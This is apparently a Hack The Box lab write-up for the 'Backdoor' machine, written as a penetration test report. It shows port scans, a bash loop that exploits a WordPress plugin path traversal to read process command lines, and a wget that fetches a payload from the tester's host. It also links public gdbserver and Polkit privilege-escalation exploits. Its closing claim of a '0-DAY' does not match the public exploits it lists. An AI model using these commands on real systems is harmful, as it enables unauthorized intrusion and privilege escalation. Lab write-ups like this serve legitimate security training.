# HTB - Backdoor

This report outlines the actions taken during a penetration test of the target system (Backdoor) `10.10.11.125`. The objective was to identify vulnerabilities, exploit weaknesses, and gain unauthorized access to the system. Below are the details of the commands and exploits used during the assessment.

## Initial Enumeration

### Nmap Scan

```bash
nmap -sV 10.10.11.125 -p-
```

result:

```
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))  
1337/tcp open waste?  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Application Assessment

- Port 80 was identified as hosting a WordPress (WP) website.
- We discovered download page for ebooks (http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php)

## UDP Scan

```bash
sudo nmap -sU backdoor.htb -p 1337
```

- A UDP scan was performed on port 1337, which was found to be closed.

## Directory Traversal and File Inclusion

- A directory traversal and file inclusion vulnerability was exploited based on the article [https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/).
- All process IDs (PIDs) were iterated to extract their `cmdline` information.
- The extracted data was saved in a text file named `pid.txt`.
We created the folowing script in bash :

```
i=1  
while ((i<1000))  
do  
echo $i curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl=/proc/$
i/cmdline >> pid.txt  
((i=i+1))  
done
  ```

## GDB Server

- GDB Server was detected on port 1337 with the help of our script

## Exploiting Vulnerabilities

- An exploit found at [https://www.exploit-db.com/exploits/50539](https://www.exploit-db.com/exploits/50539) was used.
- The exploit was written in Python and required to be executed repeatedly.

## Local HTTP Server

- A local HTTP server was set up on my machine using `python2.7 -m SimpleHTTPServer`.
- The exploit file (`fullopsec`) was downloaded from the tester's machine to the victim using `wget 10.10.14.85:8000/fullopsec`.

## Polkit Privilege Escalation

- The target system lacked `gcc`, so the Polkit exploit in Python version was used.
- The Python Polkit exploit was obtained from [https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py](https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py).

# Conclusion

The penetration test included Nmap scans, web application enumeration, directory traversal, UDP port exploration, exploitation of known vulnerabilities and a 0-DAY exploit. We were able to identify and exploit the directory traversal vulnerability, gain access to the GDB server, and use an exploit to escalate privileges.
